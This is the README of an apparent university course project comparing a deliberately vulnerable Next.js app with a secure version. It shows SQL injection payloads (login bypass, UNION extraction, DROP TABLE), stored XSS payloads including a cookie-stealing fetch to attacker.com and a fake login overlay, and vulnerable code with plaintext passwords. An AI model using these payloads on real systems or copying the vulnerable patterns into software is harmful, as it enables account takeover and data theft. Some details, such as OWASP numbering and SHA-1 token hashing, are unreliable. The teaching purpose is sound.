# Communication_LTD Cybersecurity Project - Comprehensive Documentation

## 📋 Project Overview

This project demonstrates secure vs. vulnerable web application development for Communication_LTD, a fictional telecom company. The project provides **two identical Next.js applications**:

1. **communication-ltd-vulnerable** (Port 3000) - Demonstrates common web vulnerabilities
2. **communication-ltd-secure** (Port 3001) - Demonstrates security best practices

Both applications connect to a local SQL Server database and implement the same business logic, but with different security approaches.

---

## 🎯 Project Requirements

### Part A: Core Authentication & Customer Management Features

1. **Registration** - New user account creation with password validation
2. **Login** - User authentication
3. **Change Password** - Password modification with validation
4. **Add Customer** - Customer record creation (demonstrates Stored XSS vulnerability)
5. **Forgot Password** - Password reset token generation

### Part B: Security Vulnerabilities & Mitigations

**Vulnerability Demonstrations (Vulnerable Version):**

- Stored XSS in customer name field
- SQL Injection in Register endpoint
- SQL Injection in Login endpoint
- SQL Injection in Add Customer endpoint

**Mitigation Demonstrations (Secure Version):**

- HTML encoding for XSS prevention
- Parameterized queries for SQL Injection prevention
- Alternative: Stored procedures (optional)

---

## 🗄️ Database Architecture

### Tables

#### **Users Table**

```sql
id (PK)                    -- User ID
username (UNIQUE)          -- Username (must be unique)
email (UNIQUE)             -- Email address (must be unique)
password_hash              -- Bcryptjs hash (NEVER plain text)
salt                       -- Random salt for cryptography
password_changed_date      -- Last password change timestamp
login_attempts             -- Failed login counter (for rate limiting)
locked_until               -- Account lockout timestamp (for rate limiting)
password_history (JSON)    -- Array of previous password hashes (prevent reuse)
created_date               -- Account creation timestamp
```

**Why this structure:**

- `UNIQUE` constraints prevent duplicate usernames/emails
- `password_hash` stores only hashes (never plain text)
- `login_attempts + locked_until` implement rate limiting
- `password_history` as JSON prevents reusing last N passwords
- `password_changed_date` tracks password policy compliance

#### **Customers Table**

```sql
id (PK)
user_id (FK → Users)             -- Links to user who added customer
first_name, last_name            -- Customer identification
phone, email                      -- Contact information
sector                            -- Market segment
subscription_package             -- Service tier
created_date, updated_date       -- Timestamps
```

#### **PasswordPolicies Table**

```sql
min_length                   -- Minimum password length
require_uppercase            -- Requires A-Z
require_lowercase            -- Requires a-z
require_digits               -- Requires 0-9
require_special_chars        -- Requires !@#$%^&*...
history_count                -- Number of previous passwords to check
max_login_attempts           -- Failed attempts before lockout
dictionary_enabled           -- Enable common password checking
```

#### **PasswordResetTokens Table**

```sql
id (PK)
user_id (FK)                 -- User requesting reset
token_hash (SHA-1)           -- One-way hash of token
expiry_date                  -- Token expiration (1 hour)
used                         -- Mark as consumed (prevent reuse)
created_date                 -- Creation timestamp
```

---

## 🔐 Security Implementation Details

### Section 1: Registration

#### **Vulnerable Approach**

```typescript
// DON'T DO THIS
const passwordHash = password; // Plain text!
const query = `INSERT INTO Users ... VALUES ('${username}', ..., '${passwordHash}', ...)`;
// SQL Injection: username = "'); DROP TABLE Users; --"
```

**Vulnerabilities:**

- ❌ Password stored as plain text → Complete compromise if DB breached
- ❌ String concatenation → SQL Injection attacks possible

#### **Secure Approach**

```typescript
// DO THIS
const passwordHash = await hashPasswordSecure(password); // Bcryptjs with 12 rounds
const request = pool.request();
request.input("username", sql.NVarChar, username);
request.input("password_hash", sql.NVarChar, passwordHash);
await request.query(
  `INSERT INTO Users ... VALUES (@username, ..., @password_hash, ...)`,
);
```

**Why This Works:**

- ✅ Bcryptjs: Adaptive hashing algorithm, slows down brute force attacks
- ✅ Salt: Automatically included by bcryptjs (even identical passwords get different hashes)
- ✅ Parameterized Query: Username/Password are data, never treated as code
- ✅ Input Validation: Email format checked, password complexity enforced

**Bcryptjs Benefits:**

- 12 salt rounds = ~100ms to hash per attempt (makes brute force impractical)
- Even with GPU, takes weeks to crack without the salt
- Automatically scales as computers get faster

---

## 2️⃣ Section 2: Login

#### **Vulnerable Approach**

```typescript
// DON'T DO THIS
const query = `SELECT * FROM Users WHERE username = '${username}' AND password_hash = '${password}'`;

// Attack 1: Username = "admin' --"
// Query becomes: SELECT * FROM Users WHERE username = 'admin' --' AND password_hash = '...'
// Password check is commented out! Returns admin user regardless of password!

// Attack 2: Username = "' OR '1'='1' --"
// Query becomes: SELECT * FROM Users WHERE username = '' OR '1'='1' --' AND password_hash = '...'
// Always true! Returns first user (usually admin)!

// Attack 3: Username = "' UNION SELECT 1,2,3,...--"
// Can extract data from other tables!
```

**Vulnerabilities:**

- ❌ SQL Injection: Authentication bypass
- ❌ No rate limiting: Infinite brute force attempts
- ❌ No account lockout: Attacker can try unlimited passwords

#### **Secure Approach**

```typescript
// DO THIS
const request = pool.request();
request.input('username', sql.NVarChar, username);
const userQuery = `SELECT id, username, password_hash, login_attempts, locked_until FROM Users WHERE username = @username`;
const user = await request.query(userQuery);

// Check lockout first
if (user.locked_until > NOW) return 403; // Account locked

// Use timing-safe comparison
const match = await bcryptjs.compare(password, user.password_hash);
if (!match) {
  // Increment attempts
  if (attempts >= 3) {
    // Lock for 15 minutes
    await updateLoginAttempts(userId, 15_minutes_lockout);
  }
  return 401; // Generic error (no username enumeration)
}

// Success: reset attempts
await resetLoginAttempts(userId);
```

**Why This Works:**

- ✅ Parameterized query: No SQL Injection possible
- ✅ Timing-safe comparison: No timing attack vulnerabilities
- ✅ Rate limiting: Max 3 failed attempts
- ✅ Account lockout: 15-minute suspension on max attempts
- ✅ Generic Error Messages: Won't reveal if username exists

**Rate Limiting Details:**

- Tracks failed login attempts per user
- Locks account after N consecutive failures
- Forces attacker to wait 15 minutes per cycle
- Example: To try 1,000,000 passwords → 57 years!

---

## 3️⃣ Section 3: Change Password

#### **Vulnerable Approach**

```typescript
// DON'T DO THIS
const query = `UPDATE Users SET password_hash = '${newHash}' WHERE id = ${userId}`;
// No verification of old password!
// No password history check!
// SQL Injection possible with userId!
```

**Vulnerabilities:**

- ❌ No old password verification: Anyone with userId can change password
- ❌ No password history: Can reuse old passwords immediately
- ❌ SQL Injection: ID parameter could be exploited

#### **Secure Approach**

```typescript
// DO THIS
// 1. Verify old password first
const oldMatch = await bcryptjs.compare(oldPassword, user.password_hash);
if (!oldMatch) return 401; // Wrong password

// 2. Check history
const history = JSON.parse(user.password_history);
for (const oldHash of history.slice(0, 3)) {
  const historyMatch = await bcryptjs.compare(newPassword, oldHash);
  if (historyMatch) return 400; // "Cannot reuse last 3 passwords"
}

// 3. Update with parameterized query
request.input("user_id", sql.Int, userId);
request.input("password_hash", sql.NVarChar, newHash);
request.input("password_history", sql.NVarChar, JSON.stringify(newHistory));
await request.query(
  `UPDATE Users SET password_hash = @password_hash, password_history = @password_history WHERE id = @user_id`,
);
```

**Why This Works:**

- ✅ Old password verification: Only the real user can change password
- ✅ Password history: Stored as JSON array, checked against new password
- ✅ Prevents simple patterns: Can't alternate between 2 passwords
- ✅ Parameterized query: No SQL Injection

---

## 4️⃣ Section 4: Add Customer (Stored XSS Vulnerability)

### **VULNERABILITY: Stored XSS (Cross-Site Scripting)**

#### **What is XSS?**

Injection of malicious JavaScript that executes in users' browsers. Can:

- Steal session cookies → Account takeover
- Capture keystrokes → Credential theft
- Modify page content → Phishing
- Redirect to malicious sites → Malware

#### **Vulnerable Approach**

```typescript
// DON'T DO THIS - Frontend and Backend
// Backend: Store raw input
const query = `INSERT INTO Customers (first_name, ...) VALUES ('${firstName}', ...)`;

// Frontend: Display without escaping
return <h2>{customer.first_name}</h2>; // If firstName = "<img src=x onerror='alert(1)'>"
// Result: HTML interpreted, script executes!
```

**Attack Demonstration:**

```
Customer Field Input:
first_name = "<img src=x onerror='alert(\"XSS ATTACK - Your session is compromised!\")'>"

Database Storage (Vulnerable):
"<img src=x onerror='alert(\"XSS ATTACK - Your session is compromised!\")'>"

Frontend Rendering:
<h2><img src=x onerror='alert("XSS ATTACK - Your session is compromised!")'></h2>
// Browser executes: alert() pops up!

Advanced Attack (Stealing Cookies):
<img src=x onerror="fetch('https://attacker.com/?cookie=' + document.cookie)">
// Sends user's session cookie to attacker!
```

**Vulnerabilities:**

- ❌ Raw HTML/JS stored in database
- ❌ Persists across all users viewing the data
- ❌ Frontend doesn't escape HTML

#### **Secure Approach**

**Option 1: HTML Escaping (Primary)**

```typescript
// Backend: Parameterized query (prevents injection at storage level)
request.input('first_name', sql.NVarChar, firstName);
await request.query(
  `INSERT INTO Customers (first_name, ...) VALUES (@first_name, ...)`
);

// Frontend: React automatically escapes by default
import { escape } from 'html-escaper';
return <h2>{escape(customer.first_name)}</h2>;
// Result: HTML characters rendered as text:
// "<img src=x onerror=...>" becomes literal text displayed to user!
```

**Option 2: Stored Procedures (Alternative)**

```sql
-- SQL Server Stored Procedure
CREATE PROCEDURE sp_AddCustomer
    @user_id INT,
    @first_name NVARCHAR(250),
    @last_name NVARCHAR(250),
    -- ... other params
AS
BEGIN
  INSERT INTO Customers (user_id, first_name, last_name, ...)
  VALUES (@user_id, @first_name, @last_name, ...)
END
```

**Why This Works:**

- ✅ Parameterized queries prevent injection at database level
- ✅ SQL Server treats input as data, never executes code
- ✅ HTML escaping converts dangerous chars:
  - `<` becomes `&lt;`
  - `>` becomes `&gt;`
  - `"` becomes `&quot;`
  - `'` becomes `&#x27;`
- ✅ When displayed, appears as literal text to user

**Character Encoding Examples:**
| Dangerous | Escaped | Display |
|-----------|---------|---------|
| `<` | `&lt;` | `<` (text) |
| `>` | `&gt;` | `>` (text) |
| `"` | `&quot;` | `"` (text) |
| `'` | `&#x27;` | `'` (text) |
| `&` | `&amp;` | `&` (text) |
| `)` | `&#x29;` | `)` (text) |

---

## 5️⃣ Section 5: Forgot Password (Token Generation)

#### **Vulnerable Approach**

```typescript
// DON'T DO THIS
const token = crypto.randomBytes(32).toString("hex");
// Return token in API response (exposed in network logs!)
return { success: true, token: token }; // VULNERABLE!

// Database
const insertQuery = `INSERT INTO PasswordResetTokens ... VALUES ('${token}', ...)`;
// SQL Injection possible!
```

**Vulnerabilities:**

- ❌ Token returned in response (visible in browser, logs, network)
- ❌ Plain token stored in database (if breached, tokens are valid)
- ❌ SQL Injection possible

#### **Secure Approach**

```typescript
// DO THIS
// 1. Generate cryptographically secure random token
const token = crypto.randomBytes(32).toString('hex');

// 2. Hash token with SHA-1 (one-way)
const tokenHash = crypto.createHash('sha1').update(token).digest('hex');

// 3. Store ONLY the hash in database
request.input('token_hash', sql.NVarChar, tokenHash);
request.input('expiry_date', sql.DateTime, oneHourFromNow);
await request.query(
  `INSERT INTO PasswordResetTokens (token_hash, expiry_date, used)
   VALUES (@token_hash, @expiry_date, 0)`
);

// 4. Send unhashed token via email (console in demo)
// Email: Click to reset: https://app.com/reset?token=${token}
console.log(`Reset token for ${email}: ${token}`);

// 5. User returns with token
// We hash it again and compare with stored hash
const tokenToVerify = req.body.token; // From user
const hashToCompare = crypto.createHash('sha1').update(tokenToVerify).digest('hex');
// Query: WHERE token_hash = @token_hash
const found = await db.query(...); // Compares hashes
```

**Why This Works:**

- ✅ Token is cryptographically random (256 bits = 2^256 possibilities)
- ✅ Hash stored in DB (if breached, token hash is useless)
- ✅ User has actual token (needs both for password reset)
- ✅ Token expires after 1 hour (prevents long-lived exploits)
- ✅ Token marked as used after reset (prevents reuse)
- ✅ Parameterized query prevents SQL Injection
- ✅ Generic response (doesn't reveal if email exists)

---

## 🛡️ Security Principles Applied

### 1. **Parameterized Queries (SQL Injection Prevention)**

```typescript
// WRONG
`SELECT * FROM Users WHERE username = '${username}'`;

// RIGHT
request.input("username", sql.NVarChar, username);
await request.query(`SELECT * FROM Users WHERE username = @username`);
```

**Result:** SQL Server treats `@username` as data, never executable code.

### 2. **Password Hashing with Bcryptjs**

```typescript
// WRONG
const hash = password; // Plain text!

// RIGHT
const hash = await bcryptjs.hash(password, 12); // 12 salt rounds
```

**Result:** Even if DB is breached, passwords are safe. Brute force takes years.

### 3. **Rate Limiting & Account Lockout**

```typescript
// WRONG
// Try unlimited passwords
db.query(`... WHERE username = ...`); // No attempt tracking

// RIGHT
if (loginAttempts >= 3) {
  accountLockedUntil = now + 15_minutes;
  return 403; // Account locked
}
```

**Result:** Brute force attacks become impossible. 3 attempts per 15 mins = would take years.

### 4. **Input Validation**

```typescript
// WRONG
if (!username) return; // Insufficient

// RIGHT
if (!username || username.length > 250) return 400;
if (!email || !emailRegex.test(email)) return 400;
if (password.length < 10) return 400; // Check policy
```

**Result:** Prevents malformed data from reaching database.

### 5. **Generic Error Messages**

```typescript
// WRONG
return { message: "Username not found" }; // Leaks username existence
return { message: error.message }; // Reveals DB structure

// RIGHT
return { message: "Invalid credentials" }; // Generic
```

**Result:** Attackers can't enumerate users or understand DB schema.

### 6. **Principal of Least Privilege**

```typescript
// Database user should have minimal permissions
-- Only what's needed:
-- SELECT FROM Users, Customers
-- UPDATE Users (password_hash, login_attempts)
-- INSERT INTO Customers
-- INSERT INTO PasswordResetTokens
-- NOT: DROP, ALTER, CREATE tables
```

---

## 📊 Comparison: Vulnerable vs Secure

| Feature                | Vulnerable                | Secure                     |
| ---------------------- | ------------------------- | -------------------------- |
| **Password Hashing**   | Plain text ❌             | Bcryptjs + 12 rounds ✅    |
| **SQL Injection**      | Yes ❌ (can breach DB)    | No ✅ (parameterized)      |
| **XSS Protection**     | No ❌ (can steal cookies) | Yes ✅ (HTML escaped)      |
| **Rate Limiting**      | No ❌ (unlimited tries)   | Yes ✅ (3 attempts/15 min) |
| **Password History**   | No ❌ (can reuse)         | Yes ✅ (last 3)            |
| **Old Password Check** | No ❌ (anyone can change) | Yes ✅ (verified)          |
| **Token Security**     | Plain text in DB ❌       | Hashed, 1-hour expiry ✅   |
| **Error Messages**     | Detailed ❌               | Generic ✅                 |
| **Login Attempts**     | No tracking ❌            | Tracked + locked ✅        |

---

## 🧪 Testing the Vulnerabilities

### SQL Injection Tests

**Test 1: Login Bypass (Vulnerable)**

```
username: admin' --
password: anything

Result: Logs in as admin (or first user) without correct password!
Why: Query becomes: SELECT * FROM Users WHERE username = 'admin' --' AND ...
     The "--" comments out the password check
```

**Test 2: Login Bypass (Alternative)**

```
username: ' OR '1'='1' --
password: anything

Result: Returns first user (usually admin)
Why: Query becomes: SELECT * FROM Users WHERE username = '' OR '1'='1' --' AND ...
     '1'='1' is always true!
```

**Test 3: Data Extraction**

```
username: ' UNION SELECT id,username,password_hash FROM Users; --
password: anything

Result: Extracts all usernames and passwords from database!
```

**Test 4: Table Deletion**

```
username: '); DROP TABLE Users; --
password: anything

Result: Deletes entire Users table!
Why: Query becomes: INSERT INTO Users ... '...' ); DROP TABLE Users; --' ...
```

### XSS Tests

**Test 1: Basic Alert (Vulnerable)**

```
Customer Name: <img src=x onerror="alert('XSS Attack')">

Result: Alert popup appears
Proves: JavaScript executed in browser
```

**Test 2: Cookie Stealing**

```
Customer Name: <img src=x onerror="fetch('https://attacker.com/?cookie=' + document.cookie)">

Result: Session cookie sent to attacker
Impact: Account takeover
```

**Test 3: Page Defacement**

```
Customer Name: <script>document.body.innerHTML = '<h1>HACKED!</h1>'</script>

Result: Entire page replaced with hacker message
Impact: Loss of user trust
```

**Test 4: Credential Harvesting**

```
Customer Name: <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999">
<form><input name=username><input name=password type=password><input type=submit value=Login></form></div>

Result: Fake login form overlays real page
Impact: Captures new credentials
```

---

## 🚀 Running the Projects

### Prerequisites

1. SQL Server 2019+ installed locally
2. Node.js 18+
3. SQL Server Management Studio (SSMS) or Azure Data Studio

### Setup Steps

#### Step 1: Create Database

```bash
# In SSMS or Azure Data Studio:
# File → Open → database/schema.sql
# Execute (Ctrl+Shift+E)
```

#### Step 2: Configure Environment Variables

Both projects have `.env.local` files (already created with placeholders):

**Edit: communication-ltd-vulnerable/.env.local**

```env
DB_SERVER=localhost
DB_DATABASE=Communication_LTD
DB_USER=sa
DB_PASSWORD=YourActualSQLPassword  # Change this!
DB_PORT=1433
```

**Edit: communication-ltd-secure/.env.local**

```env
DB_SERVER=localhost
DB_DATABASE=Communication_LTD
DB_USER=sa
DB_PASSWORD=YourActualSQLPassword  # Change this!
DB_PORT=1433
```

#### Step 3: Install Dependencies

**Terminal 1 - Vulnerable Version:**

```bash
cd communication-ltd-vulnerable
npm install
npm run dev
# Opens at http://localhost:3000
```

**Terminal 2 - Secure Version:**

```bash
cd communication-ltd-secure
npm install
npm run dev
# Opens at http://localhost:3001
```

#### Step 4: Test Registration

1. Go to `http://localhost:3000/register` (vulnerable)
2. Try registering:
   - Username: `testuser`
   - Email: `test@example.com`
   - Password: `SecurePass123!` (meets policy)
3. Check database to see plain-text password stored!

#### Step 5: Test SQL Injection

1. Go to `http://localhost:3000/register`
2. Username: `" OR "1"="1` + `'); DROP TABLE Customers; --`
3. Watch for SQL errors or unexpected behavior

#### Step 6: Test XSS

1. Register a user
2. Add customer with firstName: `<img src=x onerror="alert('XSS')">`
3. View customers list - alert pops up in vulnerable version!
4. Try same in secure version - displays as text literally

---

## 📝 Configuration Files

### `.env.local` Template

Both projects need this file (automatically created, fill in DB password):

```env
# Database Connection
DB_SERVER=localhost              # SQL Server instance name
DB_DATABASE=Communication_LTD    # Database name
DB_USER=sa                       # SQL Server user (default admin)
DB_PASSWORD=YourPassword         # YOUR SQL PASSWORD HERE
DB_PORT=1433                     # SQL Server port (default)

# Password Policy (from PasswordPolicies table)
CONFIG_PASSWORD_MIN_LENGTH=10
CONFIG_PASSWORD_REQUIRE_UPPERCASE=true
CONFIG_PASSWORD_REQUIRE_LOWERCASE=true
CONFIG_PASSWORD_REQUIRE_DIGITS=true
CONFIG_PASSWORD_REQUIRE_SPECIAL_CHARS=true
CONFIG_PASSWORD_HISTORY_COUNT=3
CONFIG_MAX_LOGIN_ATTEMPTS=3

# Application Settings
NEXT_PUBLIC_APP_NAME=Communication_LTD
NEXT_PUBLIC_APP_URL=http://localhost:3000  (or 3001 for secure)
```

### Why .env.local?

1. **Security:** Passwords not committed to version control
2. **Separation:** Development vs. production settings
3. **Flexibility:** Easy to change without code modifications
4. **.gitignore:** File is ignored in git (won't leak credentials)

---

## 🔍 Key Takeaways

### What Makes Code Vulnerable

1. **String Concatenation in SQL** → SQL Injection possible
2. **Plain Text Passwords** → Instant compromise if DB breached
3. **No Rate Limiting** → Brute force attacks viable
4. **Unescaped Output** → XSS attacks possible
5. **Generic Hash Functions** → Passwords cracked in hours/days
6. **No Input Validation** → Malformed data crashes app or exploited
7. **Detailed Errors** → Attackers understand system structure

### What Makes Code Secure

1. **Parameterized Queries** → SQL injection impossible
2. **Bcryptjs Hashing** → Passwords safe even if DB breached
3. **Rate Limiting** → Brute force requires years/decades
4. **Output Encoding** → XSS attacks neutralized
5. **Adaptive Hash Functions** → Automatically scales with computing power
6. **Input Validation** → Bad data rejected at entry point
7. **Generic Error Messages** → Attackers learn nothing

---

## 📚 Resources & References

### OWASP Top 10 (Web Application Security Risks)

- **A03:2021** – Injection (SQL Injection, Command Injection)
- **A07:2021** – Cross-Site Scripting (XSS)
- **A04:2021** – Insecure Design (lack of rate limiting)
- **A02:2021** – Cryptographic Failures (plain text passwords)

### Best Practices

- **NIST Guidelines:** bcryptjs with 10-12 rounds recommended
- **OWASP:** https://cheatsheetseries.owasp.org/
- **SQL Injection:** Never concatenate queries
- **XSS Prevention:** Always escape output or use frameworks that auto-escape

### .env.local Usage

| Scenario              | Action                                              |
| --------------------- | --------------------------------------------------- |
| New developer joins   | Copy `.env.local` template, fill in actual password |
| Push to GitHub        | DON'T commit `.env.local`                           |
| Production deployment | Use environment variables on server (not files)     |
| Database migration    | Update DB_SERVER and DB_PASSWORD only               |

---

## ✅ Verification Checklist

Before considering project complete:

- [ ] Database created successfully with all 4 tables
- [ ] Both Next.js projects initialize without errors
- [ ] Registration works in both versions
- [ ] SQL injection test shows vulnerability in vulnerable version
- [ ] SQL injection test is blocked in secure version
- [ ] XSS test shows vulnerability in vulnerable version
- [ ] XSS test shows text rendering in secure version
- [ ] Login rate limiting works (locked after 3 attempts)
- [ ] Password history prevents reuse in secure version
- [ ] Forgot password generates token and sends it

---

## 🎓 Learning Outcomes

After completing this project, students should understand:

1. ✅ How SQL Injection works and how to prevent it
2. ✅ How to hash passwords securely (not plain text!)
3. ✅ How Stored XSS attacks work and mitigation strategies
4. ✅ Importance of parameterized queries
5. ✅ Rate limiting and account lockout mechanisms
6. ✅ Password complexity policies and enforcement
7. ✅ Why generic error messages are important
8. ✅ Token generation and secure token storage
9. ✅ Configuration management for sensitive data
10. ✅ Secure vs. insecure development practices

---

## 📞 Support

If you encounter issues:

1. **Database connection errors:** Verify SQL Server is running, check DB_PASSWORD
2. **npm install fails:** Delete `node_modules` and `package-lock.json`, try again
3. **Port already in use:** Kill process on port 3000/3001: `netstat -ano | findstr :3000`
4. **API returns 500:** Check server console for error details
5. **XSS not working:** Ensure you're visiting `/register` page and adding customer via API

---

## 📄 License & Attribution

This project is for educational purposes in the cybersecurity course at HIT (Holon Institute of Technology).

**Created by:** GitHub Copilot
**Date:** April 2026
**Purpose:** Demonstrate secure vs. vulnerable web development practices

---

**Remember:** The vulnerable version is for learning only. NEVER use these practices in production! Always use the secure version's approach when building real applications.
